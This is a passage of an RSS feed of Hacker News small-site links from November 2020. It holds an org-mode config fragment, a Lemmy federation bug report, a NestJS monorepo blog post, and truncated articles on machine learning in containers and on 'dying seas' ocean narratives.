<span>;; Hide tasks that are scheduled in the future.</span>
<span>'</span>(org-agenda-todo-ignore-scheduled <span>'future</span>)

<span>;; Use "second" instead of "day" for time comparison.</span>
<span>;; It hides tasks with a scheduled time like "&lt;2020-11-15 Sun 11:30&gt;"</span>
<span>'</span>(org-agenda-todo-ignore-time-comparison-use-seconds <span>t</span>)

<span>;; Hide the deadline prewarning prior to scheduled date.</span>
<span>'</span>(org-agenda-skip-deadline-prewarning-if-scheduled <span>'pre-scheduled</span>)

<span>;; Customized view for the daily workflow. (Command: "C-c a n")</span>
<span>'</span>(org-agenda-custom-commands
  <span>'</span>((<span>"n"</span> <span>"Agenda / INTR / PROG / NEXT"</span>
     ((agenda <span>""</span> <span>nil</span>)
      (todo <span>"INTR"</span> <span>nil</span>)
      (todo <span>"PROG"</span> <span>nil</span>)
      (todo <span>"NEXT"</span> <span>nil</span>))
     <span>nil</span>)))
</code></pre></div><section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Thanks for <a href="https://www.reddit.com/r/orgmode/comments/jmf8dw/an_orgmode_workflow_for_task_management/gavkv1r/?context=3">this comment</a> in Reddit. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>There will be another post for Org-Mode note-taking workflow. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div>
		
	</article>
</main>







			</div>
			
		</div>
		
	</div></div>]]>
            </description>
            <link>https://whhone.com/posts/org-mode-task-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081372</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stefan Thomas - Future of Micropayments 2020 [Video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081327">thread link</a>) | @jorangreef
<br/>
November 13, 2020 | https://cinnamon.video/watch?v=450111686238536935 | <a href="https://web.archive.org/web/*/https://cinnamon.video/watch?v=450111686238536935">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://cinnamon.video/watch?v=450111686238536935</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081327</guid>
            <pubDate>Fri, 13 Nov 2020 11:54:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lemmy federation is almost ready, but it needs some final testing – dev.lemmy.ml]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081113">thread link</a>) | @schwartzworld
<br/>
November 13, 2020 | https://dev.lemmy.ml/post/42478 | <a href="https://web.archive.org/web/*/https://dev.lemmy.ml/post/42478">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I went and created an account on the Enterprise (I also created accounts on the other two instances later to test out the interactions). I then subscribed to !main@enterprise.lemmy.ml and !main@voyager.lemmy.ml. On my account page, it shows both communities as just â€œmainâ€�:</p>
<p><img src="https://dev.lemmy.ml/pictrs/image/npoeFlwzRD.png" alt=""></p>
<p>This is somewhat confusing by itself, but there is another problem: both of the links point to !main@enterprise.lemmy.ml, instead of one to Enterprise and one to Voyager.</p>
<p>Another small issue (or is it intentional?): Suppose that Iâ€™m a Voyager user viewing the !main@enterprise.lemmy.ml community. I click on â€œCreate a Postâ€�. I would expect that if I donâ€™t select a different community, itâ€™ll post the post to !main@enterprise.lemmy.ml. But actually, the just â€œmainâ€� community is selected, which means the post will go to !main@voyager.lemmy.ml if I donâ€™t select anything else. (If I select â€œ<a href="http://enterprise.lemmy.ml/main">enterprise.lemmy.ml/main</a>â€� from the community list, it posts there just fine, but itâ€™s confusing and slightly inconvenient to have to select it instead of it being already selected.)</p>
<p>Interactions between Enterprise and DS9 are somewhat odd, but I assume itâ€™s supposed to be that way? (DS9 lists Enterprise as â€œlinked instanceâ€�, but Enterprise doesnâ€™t list DS9 as â€œlinked instanceâ€�. Voyager lists both as â€œlinked instanceâ€�.) Iâ€™ll tell you what I saw anyway:</p>
<ul>
<li>DS9 user can <em>send</em> a message to Enterprise user, i. e. â€œMessage sentâ€� appears to the sender, suggesting that everything went fine â€” but the Enterprise user wonâ€™t receive any message. (In my opinion, it would be better in such cases to have some error message to the sender so that they donâ€™t think their message has been received.) Messaging between Enterprise user and Voyager user, as well as between DS9 user and Voyager user, works just fine.</li>
<li>DS9 user can vote and comment on Enterprise userâ€™s post, as well as post posts, on Voyager instance. But Enterprise user wonâ€™t see these comments, votes and posts. Voyager user will see them.</li>
<li>!main@enterprise.lemmy.ml community looks different when viewed from each of the three instances. Compare (all three pictures sorted by New): <a href="https://dev.lemmy.ml/pictrs/image/SSvmszaJMI.png">from Enterprise</a> (itâ€™s quite odd that the Pingu picture is shown there, because I actually posted it to !main@voyager.lemmy.ml), <a href="https://dev.lemmy.ml/pictrs/image/ZI4Q0lqCij.png">from Voyager</a>, and <a href="https://dev.lemmy.ml/pictrs/image/yZAPgvigxI.png">from DS9</a> (â€œCan see this?â€� post was made by DS9 user, but it isnâ€™t shown to the Voyager user, and the other two posts also are completely differentâ€¦).</li>
</ul>
</div></div></div>]]>
            </description>
            <link>https://dev.lemmy.ml/post/42478</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081113</guid>
            <pubDate>Fri, 13 Nov 2020 11:07:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simplifying back end development with NestJS monorepo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081012">thread link</a>) | @arauhala
<br/>
November 13, 2020 | https://aito.ai/blog/simplifying-backend-development-with-nestjs-monorepo/ | <a href="https://web.archive.org/web/*/https://aito.ai/blog/simplifying-backend-development-with-nestjs-monorepo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Aito console is the place where you create and manage your Aito database instances. It lets you create and manage your teams and instances, access your API keys, and manage your payment options. It also is the first step in your Aito journey. As we at Aito want you to have the smoothest experience when using and deploying machine learning applications, it is crucial that Aito console works reliably.</p><p>We continuously develop the console and sometimes old mistakes and decisions surface which causes frustration in our development process. Our initial multi repo structure was definitely one of these. Here’s how we simplified our console development process with NestJS’s monorepo mode.</p><h2>The console architecture</h2><p>The Aito console serves as a bridge between the users and Aito instances. It  consists of many different services, integrations, scripts and libraries. There are several steps before the user's requests reach all the way to the AWS and Aito instance.</p><p>The console contains four main services: the front-end React app, the console server, the customer API, and the provisioning API. Each service has a somewhat clear objective that they fulfil:</p><ul><li>The React front-end app serves the user interface for users to actually use the console and interact with their Aito instances</li><li>The console-server serves the front-end to the users and handles user authentication and sessions. It proxies authenticated requests to the customer API.</li><li>The customer API is the heart of the Aito console. It handles user data, teams, authorization, and subscriptions. Actions that require the creation or modification of Aito instances are handled by the Provisioning API.</li><li>The provisioning API handles the communication between the application logic and AWS where customer Aito instances run.</li></ul><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/monorepo-blog-architecture.png" alt="Aito console architecture"></p></div></div><p>At first, these services had essentially independent code bases and rather than shared code among them, some functionality had duplicate implementations. Because the services were still dependent on one another on the service level, we combined them into one repository which gave us the ability to do coordinated changes to all services with one pull request. Common functionalities started to grow when we made a switch from JavaScript to TypeScript and refactored every back-end service to use NestJS. Suddenly we shared types, configurations, local libraries, and packages between the services which introduced many pain points to the development flow.</p><p>Package management was maybe the biggest one. As each service was managed by their separate package.json file, it was very frustrating to maintain the same versions for every service and if one forgot to do this, very weird bugs occurred that slowed down our work.</p><p>With the local libraries that served common functionalities to every service, the problems were similar. Every time one updated a library, every service needed a new rebuild cycle to ensure that each service was using the same version of the library. This again led to weird bugs that were hard to comprehend. Sometimes the bugs surfaced not until the CI which resulted in loss of time and frustration.</p><p>We started to look for solutions to our problems to save our nerves as our problems were completely unnecessary. <a href="https://github.com/lerna/lerna">Lerna</a> was one of the first ones that came up. It can handle multiple packages with shared node modules, but it also relies on the deployments to the NPM registries, which was not suitable for us as we always use a single version of a package and we have no need to publish our packages separately. We discovered that these shared code libraries such as Lerna and <a href="https://classic.yarnpkg.com/en/docs/workspaces/">Yarn workspaces</a> offered features we did not actually need. Then we found out that NestJS already gave us an option out of the box.</p><h2>NestJS monorepo</h2><p>The monorepo mode supported by NestJS CLI tool promises to manage the dependencies and shared codebases in one workspace. The CLI tool accomplishes this by reorganizing the source code files into multiple sub-directories with shared and app specific tsconfig.json files, using a configuration file that defines the structure for NestJS CLI client. Unlike Lerna, it does not rely on package deployments. On top of that, as we already used NestJS to run our back-end services, we only had a few steps to convert our codebase:</p><ul><li>Combine NestJS applications and shared libraries</li><li>Configure nest-cli.json correctly so everything runs</li><li>Configure CircleCI to run tests and build monorepo applications correctly</li><li>Configure our infrastructure to run monorepo applications</li></ul><p>Combining the applications was a very straightforward process. Each application was moved into apps/ directory and the shared libraries were put under the libs/ directory. After this, we could configure a nest-cli.json file that defines where each application is and how it is run. Our project produced a nest-cli.json that looks something like this:</p><div data-language="json"><pre><code><span>{</span>
  <span>"collection"</span><span>:</span> <span>"@nestjs/schematics"</span><span>,</span>
  <span>"sourceRoot"</span><span>:</span> <span>"apps/mission-control/src"</span><span>,</span>
  <span>"monorepo"</span><span>:</span> <span>true</span><span>,</span>
  <span>"root"</span><span>:</span> <span>"apps/mission-control"</span><span>,</span>
  <span>"compilerOptions"</span><span>:</span> <span>{</span>
    <span>"webpack"</span><span>:</span> <span>false</span><span>,</span>
    <span>"tsConfigPath"</span><span>:</span> <span>"apps/mission-control/tsconfig.app.json"</span>
  <span>}</span><span>,</span>
  <span>"projects"</span><span>:</span> <span>{</span>
    <span>"customer-api"</span><span>:</span> <span>{</span>
      <span>"type"</span><span>:</span> <span>"application"</span><span>,</span>
      <span>"root"</span><span>:</span> <span>"apps/customer-api"</span><span>,</span>
      <span>"entryFile"</span><span>:</span> <span>"main"</span><span>,</span>
      <span>"sourceRoot"</span><span>:</span> <span>"apps/customer-api/src"</span><span>,</span>
      <span>"compilerOptions"</span><span>:</span> <span>{</span>
        <span>"tsConfigPath"</span><span>:</span> <span>"apps/customer-api/tsconfig.app.json"</span>
      <span>}</span>
    <span>}</span><span>,</span>
    <span>"console-server"</span><span>:</span> <span>{</span>
      <span>"type"</span><span>:</span> <span>"application"</span><span>,</span>
      <span>"root"</span><span>:</span> <span>"apps/console-server"</span><span>,</span>
      <span>"entryFile"</span><span>:</span> <span>"main"</span><span>,</span>
      <span>"sourceRoot"</span><span>:</span> <span>"apps/console-server/src"</span><span>,</span>
      <span>"compilerOptions"</span><span>:</span> <span>{</span>
        <span>"tsConfigPath"</span><span>:</span> <span>"apps/console-server/tsconfig.app.json"</span>
      <span>}</span>
    <span>}</span><span>,</span>
    <span>"server"</span><span>:</span> <span>{</span>
      <span>"type"</span><span>:</span> <span>"library"</span><span>,</span>
      <span>"root"</span><span>:</span> <span>"libs/server"</span><span>,</span>
      <span>"entryFile"</span><span>:</span> <span>"index"</span><span>,</span>
      <span>"sourceRoot"</span><span>:</span> <span>"libs/server/src"</span><span>,</span>
      <span>"compilerOptions"</span><span>:</span> <span>{</span>
        <span>"tsConfigPath"</span><span>:</span> <span>"libs/server/tsconfig.lib.json"</span>
      <span>}</span>
    <span>}</span>
    ...
  <span>}</span></code></pre></div><p>With the correct configuration, each application was ready to be run locally. To get everything into production, we needed to reconfigure CircleCI, our CI tool, to run correct commands to test and build every application. Lastly, we configured Heroku to run each application. After that, we had a complete development pipeline that had eliminated our biggest development flow issues.</p><h2>Conclusion</h2><p>With the NestJS monorepo, we definitely succeeded in simplifying our development process. We eliminated unnecessary versioning, and managing packages and libraries. Not counting a few bumps with Heroku, the migration to the monorepo mode was pretty straight forward. The work was mostly just restructuring the code into a structure that is also more manageable. More documentation and information about all of the steps from NestJS would have helped, especially as our team is not very experienced with NestJS platform, but I guess that is the case of every software development project.</p><a href="https://aito.ai/blog">Back to blog list</a></div></div>]]>
            </description>
            <link>https://aito.ai/blog/simplifying-backend-development-with-nestjs-monorepo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081012</guid>
            <pubDate>Fri, 13 Nov 2020 10:46:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Science and Machine Learning in Containers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081001">thread link</a>) | @patrycjaneptune
<br/>
November 13, 2020 | https://neptune.ai/blog/data-science-machine-learning-in-containers | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/data-science-machine-learning-in-containers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p>When building data science and machine learning powered products the research-development-production workflow is not linear like in traditional software development where the specs are known and problems are (mostly) understood beforehand.&nbsp;</p>



<p>There are lots of trial and error involved, including the test and use of new algorithms, trying new data versions (and managing it), packaging the product for production, end-users views and perspectives, feedback loops, and more. These make managing those projects a challenge.&nbsp;</p>



<p>Isolating the development environment from the production systems is a must if you want to assure that your application will actually work. And so putting your ML model development work inside a (docker) container can really help with:</p>



<ul><li>managing the product development,&nbsp;</li><li>keeping your environments clean (and making it easy to reset it),</li><li>most importantly, moving things from development to production becomes easier.</li></ul>



<p>In this article, we will be discussing the development of Machine Learning (ML) powered products, along with best practices for using containers. We’ll cover the following:</p>



<ul><li>Machine learning iterative processes and dependency</li><li>Version control at all stages</li><li>MLOps vs DevOps</li><li>Need for identical dev and prod environment&nbsp;</li><li>Essentials of Containers (meaning, scope, docker file and docker-compose etc.)</li><li>Jupyter notebook in containers&nbsp;</li><li>Application development with TensorFlow in containers as microservice</li><li>GPU &amp; Docker&nbsp;</li></ul>






<h2>What you need to know</h2>



<p>In order to fully understand the implementation of machine learning projects in containers, you should:</p>



<ul><li>Have a basic understanding of software development with Docker,&nbsp;</li><li>Be able to program in Python,</li><li>Be able to build basic machine learning and deep learning models with TensorFlow or Keras,</li><li>Have deployed at least one machine learning model.&nbsp;</li></ul>



<p>The following links might be useful to get you started if you don’t know Docker, Python or TensorFlow:&nbsp;</p>



<ul><li><a href="https://dev.to/pavanbelagatti/getting-started-with-docker-for-developers-3apo" target="_blank" rel="noreferrer noopener nofollow">Software development with docker</a>&nbsp;</li><li><a href="https://www.python.org/about/gettingstarted/" target="_blank" rel="noreferrer noopener nofollow">Python for beginners</a></li><li><a href="https://machinelearningmastery.com/tensorflow-tutorial-deep-learning-with-tf-keras/" target="_blank" rel="noreferrer noopener nofollow">Deep learning with TensorFlow&nbsp;</a></li></ul>






<h2>Machine learning iterative processes and dependency</h2>



<p>Learning is an iterative process. When a child learns to walk, it goes through a repetitive process of walking, falling, standing, walking, and so on – until it “clicks” and it can confidently walk.&nbsp;</p>



<p>The same concept applies to machine learning, and it’s necessary to ensure that the ML model is capturing the right patterns, characteristics and inter-dependencies from given data.&nbsp;</p>



<p>When you are building an ML-powered product or application,you need to be prepared for the iterative process in this approach, especially with machine learning.&nbsp;</p>



<p>This iterative process is not limited to product design alone, but it covers the entire cycle of product development using machine learning.&nbsp;</p>



<p>The right patterns that the algorithm needs to make right business decisions are always hidden in the data. Data scientists and MLOps teams need to put in a lot of effort to build robust ML systems capable of performing this task.&nbsp;</p>



<p>Iterative processes can be confusing. As a rule of thumb, a typical machine learning workflow should consist of at least the following stages:</p>



<ul><li>Data collection or data engineering</li><li>EDA (Exploratory Data Analysis)</li><li>Data pre-processing</li><li>Feature engineering</li><li>Model training</li><li>Model evaluation</li><li>Model tuning and debugging</li><li>Deployment</li></ul>



<p>For each stage, there is a direct or indirect dependency on other stages.&nbsp;</p>



<p>Here is how I like to view the entire workflow based on levels of system design:</p>



<ul><li><strong>The Model Level (fitting parameters):</strong> assuming that the data has been collected, EDA and basic pre-processing done, the iterative process begins when you have to select the model that fits the problem you are trying to solve. There is no shortcut, you need to iterate through some models to see which works best on your data.</li><li><strong>The Micro Level (tuning hyperparameters):</strong> once you select a model (or set of models), you begin another iterative process at the micro level, with the aim to get the best model hyperparameters.</li><li><strong>The Macro Level (solving your problem):</strong> the first model you build for a problem will rarely be the best possible, even if you tune it perfectly with cross-validation. That’s because fitting model parameters and tuning hyperparameters are only two parts of the entire machine learning problem-solving workflow. At this stage, there is a need to iterate through some techniques for improving the model on the problem you are solving. These techniques include trying other models, or ensembling.</li><li><strong>The Meta Level (improving your data):</strong> While improving your model (or training the baseline) you may see that the data that you are using is of poor quality (for example, mislabeled) or that you need more observation of a certain type (for example, images taken at night). In those situations improving your datasets and/or getting more data becomes very important. You should always keep the dataset as relevant as possible to the problem you are solving.&nbsp;</li></ul>



<p>These iterations will always lead to lots of changes in your system, so version control becomes important for efficient workflow and reproducibility.</p>






<h2>Version control at all stages</h2>



<p>Version control is a system that records changes to a file or set of files over time so that you can recall specific versions later. Because of the iterative processes involved in the development of a ML-powered product, versioning has become crucial to the success of the product, and future maintenance or optimization.&nbsp;</p>



<p>Files in your ML workflow, and systems such as notebooks, datasets, scripting files – they all need versioning.</p>



<p>There are many tools and best practises for versioning these files depending on your team’s preferences. I’ll share what works best for me.&nbsp;</p>



<p>Generally, you will use version control systems such as Git, Apache Subversion (SVC), or Concurrent Version Systems (CVS). But using only one of these systems might not be the best for machine learning projects, because of the kind of files used in the ML workflow. It’s best to add other useful tools for efficient versioning of each file.</p>



<p><strong>Data Versioning:</strong> most companies store data in a database or cloud storage / buckets, like the Amazon S3 bucket or Google Cloud Storage, where data can be pulled when needed.&nbsp;</p>



<p>Pulling a sample to best represent the problem you are trying to solve might be iterative, and it becomes important to version the data used to train a machine learning model.&nbsp;</p>



<p>There is a limit to the volume and size of file you can push to a version control platform and sometimes, the data you will be working with comes in gigabytes, so it’s not the best way to approach this.&nbsp;</p>



<p>With tools like DVC and Neptune, data versioning becomes easier. Below are some useful links to get you started with data version control:</p>



<ul><li><a href="https://docs.neptune.ai/api-reference/neptunecontrib/versioning/data/index.html" target="_blank" rel="noreferrer noopener nofollow">Neptune versioning API doc</a></li><li><a href="https://neptune.ai/vs/dvc" target="_blank" rel="noreferrer noopener nofollow">Using Neptune with DVC</a></li><li><a href="https://dvc.org/doc/start/data-versioning" target="_blank" rel="noreferrer noopener nofollow">DVC&nbsp;</a></li></ul>



<p><strong>Notebook Versioning: </strong>Jupyter, Colab notebooks generate files that may contain metadata, source code, formatted text, and rich media.&nbsp;</p>



<p>Unfortunately, this makes these files poor candidates for conventional version control solutions, which work best with plain text. The problem with these notebooks is that they are human-readable JSON .ipynb files. It is uncommon to edit the JSON source directly because the format is so verbose. It’s easy to forget required punctuation, unbalance brackets like {} and [], and corrupt the file.&nbsp;</p>



<p>More troublesome, Jupyter source code is often littered with cell output stored as binary blobs. Little changes in the notebook, such as rerunning with new data, will look like a significant change in the version control commit logs.&nbsp;</p>



<p>Some built-in solutions to effectively keep track of the file convert the notebook to HTML, or to a Python file. External tools that you can use for this are nbdime, ReviewNB, Jupytext and Neptune, to mention a few.</p>



<p>My choice is Neptune, because it can integrate with Jupyter and JupyterLab as an extension. Version control is just one of Neptune’s features. The team, project, and user management features make this more than a version control tool, but the software’s lightweight footprint may make it a compelling candidate regardless.&nbsp;</p>



<hr>



<p><strong><sup>EDITOR’S NOTE<br></sup></strong><a href="https://docs.neptune.ai/keep-track-of-jupyter-notebooks/index.html#key-features" target="_blank" rel="noreferrer noopener nofollow">Get started with notebook versioning with Neptune</a></p>



<hr>



<p><strong>Your entire project can be versioned using version control systems, and this becomes even easier with containers, which we’ll soon discuss.&nbsp;</strong></p>






<h2>MLOps vs DevOps</h2>



<p>Before we dive into containers for machine learning with TensorFlow, let’s quickly go through the similarities and differences between MLOps and DevOps.&nbsp;</p>



<p>MLOps (Machine Learning Operations) aims to manage the deployment of all types of machine learning (deep learning, federated learning, etc) in large-scale production environments.</p>



<p>DevOps (Development and Operations) is a set of practices that combines software development and IT operations at large scale. It aims to make development cycles shorter, increase deployment velocity, and create dependable releases.</p>



<p><strong>DevOps principles also apply to MLOps</strong>, but there are some aspects of machine learning workloads that require a different focus or implementation.&nbsp;</p>



<p>Having in mind the basic ML workflow we discussed earlier, we can pinpoint the following differences in MLOps and DevOps:</p>



<ol><li><strong>Team Skills:</strong> an MLOps team has research scientists, data scientists, and machine learning engineers who serve the same role as a software engineer in a DevOps team. The ML engineers have the essential skills of a software engineer, combined with data science expertise.&nbsp;</li><li><strong>Development:</strong> DevOps is linear, and MLOps is more experimental in nature. The team needs to be able to manipulate model parameters and data features, and retrain models frequently as the data changes. This requires more complex feedback loops. Also, the team needs to be able to track operations for reproducibility without impeding workflow reusability.&nbsp;</li><li><strong>Testing:</strong> in MLOps, testing requires additional methods beyond what is normally done in …</li></ol></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/data-science-machine-learning-in-containers">https://neptune.ai/blog/data-science-machine-learning-in-containers</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/data-science-machine-learning-in-containers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081001</guid>
            <pubDate>Fri, 13 Nov 2020 10:44:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “Dying Seas” of the Anthropocene]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25080998">thread link</a>) | @dnetesn
<br/>
November 13, 2020 | http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene | <a href="https://web.archive.org/web/*/http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>D</span>eclarations that the ocean is dying have become commonplace. We read headlines almost daily telling us that the oceans are choked with plastic, overfished, and rapidly acidifying. Yet even in â€œdying,â€� we are told, the ocean threatens human existence as sea levels rise, sea surface temperatures increase, and commercial fish stocks disappear.&nbsp;</p><p>The ocean has thus become emblematic both of a natural world victimized by humanity and of natureâ€™s possible vengeance. In a 2014 video by the nonprofit organization Conservation International, the growling baritone of the actor Harrison Ford speaks for the ocean: â€œI give. They take. But I can always take back.â€�&nbsp; The message is powerful because it conjures images of both the primordial sea as crucible of life and the biblical flood—destruction of life as punishment for human sin. Yet a vengeful ocean is but one of several historical depictions of the sea, some of which have gained prominence at particular moments while others have faded away. In the 1960s and 1970s many scientists, engineers, and policy makers approached the ocean as a vast but resistant reservoir of untapped natural resources. The hostility of the ocean was understood in the context of national calls for increasing exploitation. US Rear Admiral William C. Hushing, for example, in 1967 described the ocean as â€œhostile in almost every way you can think.â€� In Hushingâ€™s view, the task set for â€œManâ€� was â€œto train himself for the hostilityâ€� and eventually â€œfind ways to convert the hostility to friendliness.â€�&nbsp;</p>
<p>Today, the ocean is increasingly cast as fragile, even as dying. And while the ocean voiced by Harrison Ford remains threatening, the message is that humans are responsible for that threat. We, not the ocean, have taken too much. Once we recognize the increasing dominance of a conception of the ocean as fragile and dying, we are prompted to ask how this shapes conservation efforts and whether it has a net positive or negative influence on marine environmental protection. In the fall of 2016, for example, <em>Outside Magazine </em>published an obituary for the Great Barrier Reef. The article quickly went viral, but coral reef scientists condemned the story as irresponsible. The Great Barrier Reef, they pointed out, although under severe threat, was not yet dead. To declare it lifeless was to give up hope. Environmental pessimism comes at a cost. When pseudoscientific claims gain traction, it is often because they appeal to emotions and long-standing narratives already associated with particular environmental spaces.</p>
<p>Dying-seas narratives and imagery may actually hamper communication between scientists and the public. As an example, Jay Cullen, a researcher at the University of Victoria, leads a project to monitor Fukushima radiation in the eastern Pacific. When Cullenâ€™s lab reported that trace radiation was present off the coast of British Columbia but did not represent a significant health hazard, the response was vociferously angry, including death threats aimed at Cullen. In the case of the Fukushima radiation reports, one publicâ€™s response was to reject scientific claims that did not support the narrative of threatening â€œdying seas.â€� To quote the <em>Globe and Mail: </em>â€œDr. Cullen said he frequently hears from people that his science simply canâ€™t be right because the Pacific Ocean is dying. It is adrift with tsunami debris and plastic waste and its stocks have been overfished, but it has not been killed by nuclear radiation.â€�</p>
<blockquote>Hope, like fear, has power to shape the world we will inhabit.</blockquote>
<p>Although hampering science communication, the dying-seas narrative may also contribute to misguided efforts at environmental restoration. In 2012 a native community on Haida Gwaii paid $2.5 million to an American entrepreneur to carry out an iron-seeding experiment off the coast of British Columbia. The goal was to dump iron dust into the sea to artificially trigger a plankton bloom and restore the local salmon population while also sequestering carbon dioxide. As mentioned earlier, oceanographers pioneered iron-seeding experiments but came to deem the method as too risky for practical use. The Haida Gwaii iron-seeding project was therefore condemned by the international scientific community as having violated two international agreements to place checks on unregulated geoengineering. Yet a lay public that was sold on <em>saving </em>a â€œdying seaâ€� triggered what many in the scientific community saw to be dangerous â€œrogue science.â€� Nor is the 2012 iron-seeding event the only scientifically questionable technological solution marketed as a solution for marine ecological crises. A far more ambitious engineering project to skim microplastics from the North Pacific sea surface is now being tested. The Ocean Cleanup project was founded by a teenage Dutch inventor who, after delivering a viral TEDx speech and raising $2.2 million in crowdsourced funding, dropped out of university to develop his project. Despite concerns voiced by oceanographers that the device will not only be ineffective but will harm pelagic marine creatures, the installation was deployed in late 2018.
On a much smaller scale, millions of dollars have been invested in engineering projects around the world in the Sisyphean task of trying to hold back rising seas as the Greenland and Antarctic ice sheets melt. It may be that future oceanographers, unlike their predecessors, will be less focused on encouragement of widespread collaborative observation and experimentation at sea and more concerned with oversight and restriction of interfering scientific and engineering practices.&nbsp;</p>
<p>Unsurprisingly, the projection of sentience onto the natural world fails to move climate change skeptics. Appeals to safeguard individual charismatic species, like the polar bear, risk critique as devaluing human existence in favor of other forms of life. Descriptions of the earth as a victim of human agency are dismissed by political opponents as scientific hubris. Even publics potentially receptive to conservation science risk being demoralized by imaginative invocation of a vast, â€œdyingâ€� non-human entity. The author of a 2014 editorial in <em>Smithsonian Magazine </em>notes, â€œWeâ€™ve gone from thinking the ocean was too big to hurt, to thinking that the ocean is too big and too sick to help.â€� This cognitive-emotional orientation has been unintentionally fostered by scientists intent on educating a lay public on the importance of global systems thinking. Yet the popularization of this approach to nature has its pitfalls. Conceptualizing the oceans as a cohesive nonhuman entity oversimplifies accounts of environmental degradation and limits understanding of local variability.&nbsp;</p>
<p>In 2013, Microsoft cofounder Paul Allen announced a contest called Ocean Challenge. The contest awarded â€œ$10,000 to the most promising new science-based concept for mitigating environmental and/or societal impacts of ocean acidification.â€� The winners of the contest were Ruth D. Gates of the University of Hawaii and Madeleine van Oppen of the Australian Institute of Marine Science. Their project to genetically select and cultivate corals that possess natural resistance to ocean acidification received funding. Coral reefs take up less than 1 percent of the earthâ€™s surface, yet they are habitats for an estimated one-third of all known marine creatures, including 25 percent of commercial seafood species. They also act as natural breakwaters, dampening the power of storm surges and coastal erosion. An estimated 61 percent of coral reefs are under stress and at risk of disappearing by 2030. Thus, the health of coral reefs is widely used as a metric for global ocean health, the marine equivalent of the canary in the coal mine. Gates, who passed away in October 2018, described herself as â€œa futurist.â€� â€œA lot of people want to go back to something. They think, If we just stop doing things, maybe the reef will come back to what it was,â€� she explained. In contrast, her project acknowledged a future â€œwhere nature is no longer fully natural.â€� In Gatesâ€™s understanding, the ocean isnâ€™t dead, but its survival hinges on assumption of responsibility for its now-hybrid character. Is there a cost to abandoning the nineteenth-century ideal of wilderness? Perhaps doing so is the price we must pay to retain a semblance of what once was.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_6dede823a3aee1159948a355f8d25912.jpg" alt="Screen Shot 2020-11-11 at 9.06.26 PM"><figcaption><span>Detail from a mural by Louis Masai in Shoreditch, London. </span><br><span><a href="https://www.flickr.com/photos/maureen_barlin/21563934214/in/photolist-yRwNnd-nBHi7g-J1mTKy-uR5dZN-yKkUdq-ZpCe1C-tWo3oY-zcVVAU-z1WCtb-vx1TMN-A7rnFd-f8wmYU-tWnYzA-uToKiz-dQNque-HWgEzz">Maureen Barlin</a>. </span></figcaption></figure>
<p>Some theorists and scientists advocate greater inclusion of nonhuman actors in debates about ecological crisis. Bruno Latour, for example, argues that â€œa science of objects and politics of subjectsâ€� must be replaced by a â€œpolitical ecology of collectives consisting of humans and nonhumans.â€� A precedent has been set by the recent allocation of legal rights to rivers in Australia, New Zealand, and India. But although we must not shirk from placing value on nonhuman entities, in the end climate change—and by extension marine environmental degradation—remains a human problem, and we need to foreground human abilities to comprehend and solve it. As Jean-Michel Cousteau, son of Jacques, asserts, â€œThe face of our planet is the ocean. It is the largest ecosystem on our Earth. But the face of climate change is not the whale, the polar bear, the glacier, the rainforest or the desert. The face of climate change is us.â€�&nbsp;<br></p>
<p>The marine sciences, like all branches of scientific knowledge, are shaped by underlying assumptions about human relationship with the natural world. The tensions I have highlighted point to a crisis in scientific and lay imaginations of an ocean radically changed in the course of the Anthropocene. Scientists increasingly talk about the ocean as a hybrid environment. Gates was surely correct in asserting that scientific solutions for an ocean understood as dying can be reached only by acknowledging that the contemporary ocean cannot be conceived apart …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</a></em></p>]]>
            </description>
            <link>http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080998</guid>
            <pubDate>Fri, 13 Nov 2020 10:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Silicon, Xeon Phi, and Amigas]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080913">thread link</a>) | @ingve
<br/>
